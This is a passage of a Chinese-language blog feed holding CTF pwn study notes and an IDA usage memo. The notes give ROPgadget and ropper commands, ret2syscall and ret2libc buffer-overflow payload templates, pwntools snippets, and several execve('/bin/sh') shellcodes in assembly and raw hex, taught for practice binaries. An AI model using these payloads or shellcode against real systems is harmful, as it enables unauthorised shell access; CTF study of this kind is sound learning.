class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget</span><br><span class="line">使用ROPgadget搜索操作寄存器的函数地址：ROPgadget --binary level2_x64 --only &quot;pop|ret&quot;</span><br><span class="line">寻找控制eax的gadgets：ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; |grep &#x27;eax&#x27;</span><br><span class="line">寻找控制寄存器的地址：ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; |grep &#x27;eax&#x27;|grep &#x27;ebx&#x27;</span><br><span class="line">获得/bin/sh字符串对应的地址：ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; </span><br><span class="line">获得int 0x80的地址：ROPgadget --binary rop --only &#x27;int&#x27;</span><br><span class="line"></span><br><span class="line">eax寄存器存放系统调用号，ebx寄存器存放想要执行的/bin/sh的地址，还有两个参数设置为 0</span><br><span class="line">所以现在需要做的就是让：</span><br><span class="line">    eax=0xb#execve的系统调用号</span><br><span class="line">    ebx=/bin/sh 的地址  #要执行/bin/sh的地址</span><br><span class="line">    ecx=0#置为0</span><br><span class="line">    edx=0#置为0</span><br><span class="line">只需要让栈顶的值是0xb然后可以通过pop eax达到目的</span><br><span class="line"></span><br><span class="line">ropper --file ret2text --search &#x27;pop rdi&#x27;</span><br><span class="line">ropper --file ret2text --chain execveropper 或者ropper --file ret2text --chain execve</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/pwnstudy/2.jpg"></p><p>上图说明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload= b&#x27;a&#x27;*112+p32(pop_eax)+p32(0xb)+p32(pop_else)+p32(0)+p32(0)+p32(bin_sh_add)+p32(int_addr)</span><br><span class="line">#填满栈空间+返回地址+0xb会被放入eax中+返回地址+0会被放到edx+0会被放到ecx+bin/sh放到ebx+int 80中断</span><br><span class="line">#填满栈空间，返回地址，0xb会被放入eax中，返回地址，0会被放到edx，0会被放到ecx，bin/sh放到ebx，int 80中断</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload= b&#x27;a&#x27;*112+p32(sys_addr)+p32(0x1234)+p32(bin_sh)</span><br><span class="line">#栈空间112，返回地址system，system返回地址可以任意，\bin\sh的地址</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/pwnstudy/3.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*112+p32(get_addr)+p32(sys_addr)+p32(bss_addr)+p32(bss_addr)</span><br><span class="line">#栈空间，返回地址，get返回地址，get写入的地方，任意地址即可</span><br><span class="line">sys返回地址，sys参数</span><br></pre></td></tr></table></figure><h2 id="工具大概用法"><a href="#工具大概用法" class="headerlink" title="工具大概用法"></a>工具大概用法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">cat</span><br><span class="line">查看execve的系统调用号：cat /usr/include/asm/unistd_32.h | grep execve</span><br><span class="line"></span><br><span class="line">ROPgadget</span><br><span class="line">使用ROPgadget搜索操作寄存器的函数地址：ROPgadget --binary level2_x64 --only &quot;pop|ret&quot;</span><br><span class="line">寻找控制eax的gadgets：ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; |grep &#x27;eax&#x27;</span><br><span class="line">寻找控制寄存器的地址：ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; |grep &#x27;eax&#x27;|grep &#x27;ebx&#x27;</span><br><span class="line">获得/bin/sh字符串对应的地址：ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; </span><br><span class="line">获得int 0x80的地址：ROPgadget --binary rop --only &#x27;int&#x27;</span><br><span class="line"></span><br><span class="line">gdb：</span><br><span class="line">加载程序：gdb ./程序名称</span><br><span class="line">运行程序：r、run</span><br><span class="line">下断点：b *地址、b *$rebase(0x933)、b 函数名称、break 函数名称</span><br><span class="line">获取函数在内存中的位置：print 函数名称、p 函数名称、p system</span><br><span class="line">查找字符串：find &#x27;/bin/sh&#x27;</span><br><span class="line">查看断点信息：info b或者info break</span><br><span class="line">删除断点：delete 序号</span><br><span class="line">单步调试：ni</span><br><span class="line">下一步：n</span><br><span class="line">跳出函数：fini</span><br><span class="line">查看栈的状态：stack 数字、stack 40</span><br><span class="line">gdb调试转储：gdb level1 core</span><br><span class="line">查看地址里面的信息：x/x $寄存器名称</span><br><span class="line"></span><br><span class="line">cyclic:</span><br><span class="line">生成若干数量的字符：cyclic 150 </span><br><span class="line">转码：cyclic -l 0x62616164</span><br><span class="line"></span><br><span class="line">objdump:</span><br><span class="line">查看反汇编代码：objdump -d 文件名</span><br><span class="line"></span><br><span class="line">readelf:</span><br><span class="line">查看文件中重定向信息：readelf -r 文件名</span><br></pre></td></tr></table></figure><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">IDA</span><br><span class="line">pwntools</span><br><span class="line">pwndbg</span><br><span class="line">checksec 文件名：查看保护机制</span><br><span class="line">one_gadget</span><br><span class="line">readelf</span><br><span class="line">gdb</span><br><span class="line">vmmap可以看权限</span><br><span class="line">objdump</span><br><span class="line">LibcSearcher  确定libc版本</span><br><span class="line">ldd   确定libc版本https://libc.blukat.me/</span><br><span class="line">ropper</span><br><span class="line">ROPgadget搜索操作寄存器的函数地址</span><br><span class="line">cyclic</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="PWNTOOLS"><a href="#PWNTOOLS" class="headerlink" title="PWNTOOLS"></a>PWNTOOLS</h2><p><a href="http://192.168.3.228:81/pwntools/">pwntools文章</a></p><pre><code>context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)#操作系统，系统位数content=1#控制远程或者本地#remote：主要用作远程和服务器交互，返回一个类似连接对象#p64：将数字转为字符串（p64/u64打包/解包   p32/u32）#send：发送数据，通过连接对象调用#interactive：反弹shell#sh.sendlineafter(&#39;&#39;,)#遇到xxx语句停下来，发送某个数据#sh.recvuntil(&#39;OK,this time we will get a shell.\n&#39;)  # 接收到xxx#sh.sendlineafter(&quot;Input:\n&quot;,payload)#遇到xxx语句停下来，发送某个数据puts_addr= u32(sh.recv(4))        #获取put函数的地址elf = ELF(&#39;stack1&#39;)                   #读取整个文件，并且分析文件elf.plt[&quot;system&quot;]                #system在plt表的位置，需要使用hex()转换hex(elf.plt[&quot;system&quot;])转成16进制elf.got[&#39;puts&#39;]                    #puts函数在pot表中的位置，需要使用hex()转成16进制elf.symbols[&#39;main&#39;]                #定位文件main函数的地址elf.search(b&quot;/bin/bash&quot;)        #搜寻某个字符串的位置，需要使用next(elf.search(b&quot;/bin/bash&quot;))next(elf.search(b&quot;/bin/bash&quot;))  #找到包含‘/bin/bash’(字符串，汇编代码或某个数值的地址)#通过libc泄露某个函数地址的方法：通过got泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数地址gdb.attach(p)#跟gdb交互shellcraft.sh()        #生成shellcode, 汇编语言asm(shellcraft.sh())#将shellcode代码组装成字节,十六进制形式playlod=b&#39;a&#39;*(0x6c-0x68)+p64(1853186401)#溢出#buf这个字符数组的长度只有0x80，而我们可以输入0x200的东西payload=payload+ b&#39;a&#39;*(112-len(payload))+p32(buf2_addr)#溢出需要112个字符，可以填充满</code></pre><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Tab键 切回到汇编窗口</span><br><span class="line">空格键 反汇编窗口切换文本跟图形</span><br><span class="line">ESC 退到上一个操作地址</span><br><span class="line">G 搜索g地址或者符号</span><br><span class="line">N 重命名</span><br><span class="line">分号键 注释</span><br><span class="line">ALT+M 添加标签</span><br><span class="line">CTRL+M 列出所有标签</span><br><span class="line">CTRL+S 二进制段的开始地址结束地址</span><br><span class="line">C code光标地址出内容解析成代码</span><br><span class="line">P 在函数开始处使用P，从当前地址处解析成函数</span><br><span class="line">D data解析成数据</span><br><span class="line">A ASCII解析成ASCII</span><br><span class="line">U unDefined解析成未定义的内容</span><br><span class="line">X 交叉引用</span><br><span class="line">F5 看反汇编后的C代码</span><br><span class="line">ALT+T 搜索文本</span><br><span class="line">ALT+B 搜索16进制,搜索opcode如ELF文件头</span><br><span class="line">CTRL+ALT+B 打开断点列表 </span><br><span class="line">F7 单步步入即单步进入函数</span><br><span class="line">F8 单步不过即单步跨过函数</span><br><span class="line">CTRL+F7 运行到函数返回地址</span><br><span class="line">F4 运行到光标处即运行到选中位置</span><br><span class="line">F2 下断点/取消断点</span><br><span class="line">F9 运行程序 </span><br><span class="line">Shift+F12 查看string</span><br></pre></td></tr></table></figure><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">$ pip install ropgadget</span><br><span class="line">$ ROPgadget</span><br><span class="line">用法：ROPgadget.py [-h] [-v] [-c] [ --binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                    [ --string &lt;字符串&gt;] [--memstr &lt;字符串&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                    [ --only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                    [ --badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                    [ --re &lt;re&gt;] [--offset &lt;hexaddr&gt;] [--ropchain] [--thumb]</span><br><span class="line">                    [ --console] [--norop] [--nojop] [--nosys] [--multibr]</span><br><span class="line">                    [ --all] [--dump]</span><br><span class="line"></span><br><span class="line">可选参数：</span><br><span class="line">    -h, --help 显示此帮助信息并退出</span><br><span class="line">    -v, --version 显示 ROPgadget 的版本</span><br><span class="line">    -c, --checkUpdate 检查是否有新版本可用</span><br><span class="line">    --binary &lt;binary&gt; 指定要分析的二进制文件名</span><br><span class="line">    --opcode &lt;opcodes&gt; 在可执行段中搜索操作码</span><br><span class="line">    --string &lt;string&gt; 在可读段中搜索字符串</span><br><span class="line">    --memstr &lt;string&gt; 搜索所有可读段中的每个字节</span><br><span class="line">    --depth &lt;nbyte&gt; 搜索引擎的深度（默认 10）</span><br><span class="line">    --only &lt;key&gt; 只显示具体说明</span><br><span class="line">    --filter &lt;key&gt; 抑制特定指令</span><br><span class="line">    --range &lt;start-end&gt; 在两个地址之间搜索 (0x...-0x...)</span><br><span class="line">    --badbytes &lt;byte&gt; 拒绝小工具地址中的特定字节</span><br><span class="line">    --rawArch &lt;arch&gt; 为原始文件指定一个拱形</span><br><span class="line">    --rawMode &lt;mode&gt; 指定原始文件的模式</span><br><span class="line">    --re &lt;re&gt; 正则表达式</span><br><span class="line">    --offset &lt;hexaddr&gt; 指定小工具地址的偏移量</span><br><span class="line">    --ropchain 启用 ROP 链生成</span><br><span class="line">    --thumb 为搜索引擎使用拇指模式（仅限 ARM）</span><br><span class="line">    --console 为搜索引擎使用交互式控制台</span><br><span class="line">    --norop 禁用 ROP 搜索引擎</span><br><span class="line">    --nojop 禁用 JOP 搜索引擎</span><br><span class="line">    --callPreceded 仅显示调用前的小工具（仅限 x86）</span><br><span class="line">    --nosys 禁用 SYS 搜索引擎</span><br><span class="line">    --multibr 启用多个分支小工具</span><br><span class="line">    --all 禁止删除重复的小工具</span><br><span class="line">    --dump 输出小工具字节</span><br></pre></td></tr></table></figure><h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><p>32位python 官方版</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">    /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">    /* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line">    push 0x1010101</span><br><span class="line">    xor dword ptr [esp], 0x1016972</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx /* null terminate */</span><br><span class="line">    push 4</span><br><span class="line">    pop ecx</span><br><span class="line">    add ecx, esp</span><br><span class="line">    push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* 0xb */</span><br><span class="line">    pop eax</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure><p>32位精简版</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#########################################################################</span><br><span class="line">## 一般函数调用参数是压入栈中，这里系统调用使用寄存器</span><br><span class="line">## 需要对如下几个寄存器进行设置，可以比对官方的实现</span><br><span class="line">  ebx = /bin/sh     ## 第一个参数</span><br><span class="line">  ecx = 0             ## 第二个参数</span><br><span class="line">  edx = 0             ## 第三个参数</span><br><span class="line">  eax = 0xb           ## 0xb为系统调用号，即sys_execve()系统函数对应的序号</span><br><span class="line">  int 0x80            ## 执行系统中断</span><br><span class="line">######################################################################### </span><br><span class="line">## 更精炼的汇编代码</span><br><span class="line">## 这里说明一下，很多博客都会用&quot;/bin//sh&quot;或者官方的&quot;/bin///sh&quot;</span><br><span class="line">## 作为第一个参数，即添加/线来填充空白字符。这里我将&quot;/bin/sh&quot;</span><br><span class="line">## 放在最前面，就不存在汇编代码中间存在空字符截断的问题；另外</span><br><span class="line">## &quot;/bin/sh&quot;是7个字符，32位中需要两行指令，末尾未填充的空字符</span><br><span class="line">## 刚好作为字符串结尾标志符，也就不需要额外压一个空字符入栈。</span><br><span class="line">push 0x68732f        # 0x68732f --&gt; hs/     little endian</span><br><span class="line">push 0x6e69622f      # 0x6e69622f --&gt; nib/  little endian</span><br><span class="line">mov ebx, esp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor ecx, ecx</span><br><span class="line">mov al, 0xb          # al为eax的低8位</span><br><span class="line">int 0x80</span><br><span class="line">## 汇编之后字节长度为20字节</span><br></pre></td></tr></table></figure><p>64位shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">    /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">    push 0x68</span><br><span class="line">    mov rax, 0x732f2f2f6e69622f</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">    /* push b&#x27;sh\x00&#x27; */</span><br><span class="line">    push 0x1010101 ^ 0x6873</span><br><span class="line">    xor dword ptr [rsp], 0x1010101</span><br><span class="line">    xor esi, esi /* 0 */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push 8</span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* 0 */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* 0x3b */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p>64位精简版</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">######################################################################</span><br><span class="line">## 64位linux下，默认前6个参数都存入寄存器，所以这里没的说也使用寄存器 </span><br><span class="line">## 寄存器存储参数顺序，参数从左到右：rdi, rsi, rdx, rcx, r8, r9</span><br><span class="line"></span><br><span class="line">rdi = /bin/sh        ## 第一个参数</span><br><span class="line">rsi = 0              ## 第二个参数 </span><br><span class="line">rdx = 0              ## 第三个参数 </span><br><span class="line">rax = 0x3b           ## 64位下的系统调用号</span><br><span class="line">syscall              ## 64位使用 syscall</span><br><span class="line">#####################################################################</span><br><span class="line">## 精炼版本</span><br><span class="line">##</span><br><span class="line">## 这里说明一下，很多博客都会用&quot;/bin//sh&quot;或者官方的&quot;/bin///sh&quot;</span><br><span class="line">## 作为第一个参数，即添加/线来填充空白字符。这里我将&quot;/bin/sh&quot;</span><br><span class="line">## 放在最前面，就不存在汇编代码中间存在空字符截断的问题；另外</span><br><span class="line">## &quot;/bin/sh&quot;是7个字符，64位中需要一行指令，末尾未填充的空字符</span><br><span class="line">## 刚好作为字符串结尾标志符，也就不需要额外压一个空字符入栈。</span><br><span class="line"></span><br><span class="line">    mov rbx, 0x68732f6e69622f  # 0x68732f6e69622f --&gt; hs/nib/  little endian</span><br><span class="line">    push rbx</span><br><span class="line">    push rsp </span><br><span class="line">    pop rdi</span><br><span class="line">    xor esi, esi               # rsi低32位</span><br><span class="line">    xor edx, edx               # rdx低32位</span><br><span class="line">    push 0x3b</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    ## 汇编之后字节长度为22字节</span><br></pre></td></tr></table></figure><p>32位的shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 二进制 </tag>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA使用说明备忘录</title>
      <link href="/article/2021-12-24-IDA%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"/>
      <url>/article/2021-12-24-IDA%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<p>PWN的工具的的指令手册。</p><span id="more"></span><h1 id="IDA基本使用"><a href="#IDA基本使用" class="headerlink" title="IDA基本使用"></a>IDA基本使用</h1><h2 id="1-打开文件"><a href="#1-打开文件" class="headerlink" title="1.打开文件"></a>1.打开文件</h2><p>可以被IDA解析的文件包括.exe、.so、.o等格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）左窗口为函数列表，一个文件被反编译后所有的函数列表都可以在此窗格中显示；</span><br><span class="line">（2）右窗口为汇编代码区，双击每个函数，可以看到对应函数对应的汇编代码段；</span><br><span class="line">（3）下窗口为输出窗口，文件反汇编过程中的信息都可以在此窗口中看到。</span><br></pre></td></tr></table></figure><p>（1）空格可以切换汇编代码为流程图浏览模式<br>（2）在流程图模式下，绿线代表判定条件成立，红线代表判定条件不成立</p><h2 id="2-菜单模块"><a href="#2-菜单模块" class="headerlink" title="2.菜单模块"></a>2.菜单模块</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File , Edit , Jump , Search , View , Debugger , Options , Windows , Help</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.File 是用来打开，新建，装载一个应用程序的</span><br><span class="line">2.Edit 是用来编辑反汇编代码的，可以复制，筛选什么的。</span><br><span class="line">3.Jump 是用来跳转的，可以有很多种类型的跳转，比如跳转到上一个位置或者下一个位置，跳转到某个指定的地址。还可以根据名字，函数来进行跳转，跳转到一个新的窗口，跳转某一个偏移量等等。</span><br><span class="line">4.Serach 是用来搜索的。</span><br><span class="line">5.View 是用来选择显示方式的，或者显示某一特定模块信息的。比如以树形逻辑图显示，或者16进制形式显示。还可以单独显示某一特定信息，比如输入或者输出表等。</span><br><span class="line">6.Debugger 调试器被集成在IDA中，首先我们使用IDA装入文件，来生成数据库，用户可以使用反汇编功能，查看所有反汇编信息，这些均可以在调试器中进行和使用。</span><br><span class="line">7.Options 在这里可以进行一下常规性的设置。</span><br><span class="line">8.Windows </span><br><span class="line">9.Help 使用IDA的一些帮助文档，检查更新等等。</span><br></pre></td></tr></table></figure><h2 id="3-打开后的窗口"><a href="#3-打开后的窗口" class="headerlink" title="3.打开后的窗口"></a>3.打开后的窗口</h2><p>打开文件之后进入这个页面</p><p><img src="/image/media/2022/pwn/0.jpg"></p><p>其中这几个默认都在</p><p><img src="/image/media/2022/pwn/12.jpg"></p><p>开启位置</p><p><img src="/image/media/2022/pwn/14.jpg"></p><h3 id="1-伪代码查看（F5）"><a href="#1-伪代码查看（F5）" class="headerlink" title="1.伪代码查看（F5）"></a>1.伪代码查看（F5）</h3><p><img src="/image/media/2022/pwn/11.jpg"></p><p>通过F5大致可以看出代码构造，与源代码几乎相差不多</p><h3 id="2-Hex-View-1"><a href="#2-Hex-View-1" class="headerlink" title="2.Hex View-1"></a>2.Hex View-1</h3><p>可以查看16进制代码，方便定位代码后使用其他工具修改，具体表示如下图所示：</p><p><img src="/image/media/2022/pwn/13.jpg"></p><h3 id="3-Stuuctures"><a href="#3-Stuuctures" class="headerlink" title="3.Stuuctures"></a>3.Stuuctures</h3><p>可以查看程序的结构体：</p><p><img src="/image/media/2022/pwn/15.jpg"></p><h3 id="4-Enums"><a href="#4-Enums" class="headerlink" title="4.Enums"></a>4.Enums</h3><p>可以查看枚举信息：</p><p><img src="/image/media/2022/pwn/16.jpg"></p><h3 id="5-Imports"><a href="#5-Imports" class="headerlink" title="5.Imports"></a>5.Imports</h3><p>可以查看到输入函数，导入表即程序中调用到的外面的函数：</p><p><img src="/image/media/2022/pwn/17.jpg"></p><h3 id="6-Exports"><a href="#6-Exports" class="headerlink" title="6.Exports"></a>6.Exports</h3><p>可以查看到输出函数：</p><p><img src="/image/media/2022/pwn/18.jpg"></p><h2 id="4-常用窗口"><a href="#4-常用窗口" class="headerlink" title="4.常用窗口"></a>4.常用窗口</h2><h3 id="1）常量字符串窗口：（shift-f12）"><a href="#1）常量字符串窗口：（shift-f12）" class="headerlink" title="1）常量字符串窗口：（shift+f12）"></a>1）常量字符串窗口：（shift+f12）</h3><p><img src="/image/media/2022/pwn/1.jpg"></p><p>点击之后进入此界面能看到字符串信息</p><p><img src="/image/media/2022/pwn/2.jpg"></p><p>通过此窗口可以看到程序中所有的常量字符串列表，逆向分析一个程序从字符串入手是一个方向。</p><h3 id="2）字符串查找窗口：（alt-t）"><a href="#2）字符串查找窗口：（alt-t）" class="headerlink" title="2）字符串查找窗口：（alt+t）"></a>2）字符串查找窗口：（alt+t）</h3><p><img src="/image/media/2022/pwn/3.jpg"></p><p>在弹出框中输入字符串</p><p><img src="/image/media/2022/pwn/4.jpg"></p><p>可以通过此窗口查找某个指定的字符串。</p><h3 id="3）地址跳转：（G）"><a href="#3）地址跳转：（G）" class="headerlink" title="3）地址跳转：（G）"></a>3）地址跳转：（G）</h3><p>使用该窗口可以跳转到指定地址的汇编代码段。</p><p><img src="/image/media/2022/pwn/5.jpg"></p><p><img src="/image/media/2022/pwn/6.jpg"></p><p>地址为语句前的.text：xxxxxxxxxxxxxxxx</p><h3 id="4）脚本执行窗口：-alt-f7"><a href="#4）脚本执行窗口：-alt-f7" class="headerlink" title="4）脚本执行窗口：(alt+f7)"></a>4）脚本执行窗口：(alt+f7)</h3><p><img src="/image/media/2022/pwn/7.jpg"></p><h3 id="5）Xrefs-graph-to和Xrefs-graph-from：（函数名上右击）"><a href="#5）Xrefs-graph-to和Xrefs-graph-from：（函数名上右击）" class="headerlink" title="5）Xrefs graph to和Xrefs graph from：（函数名上右击）"></a>5）Xrefs graph to和Xrefs graph from：（函数名上右击）</h3><p><img src="/image/media/2022/pwn/8.jpg"></p><p>通过Xrefs graph to可以看到该函数被其他函数调用的信息：</p><p><img src="/image/media/2022/pwn/9.jpg"></p><p>通过Xrefs graph from可以看到该函数调用的其他函数：</p><p><img src="/image/media/2022/pwn/10.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tools</title>
      <link href="/article/2021-12-22-tools/"/>
      <url>/article/2021-12-22-tools/</url>
      
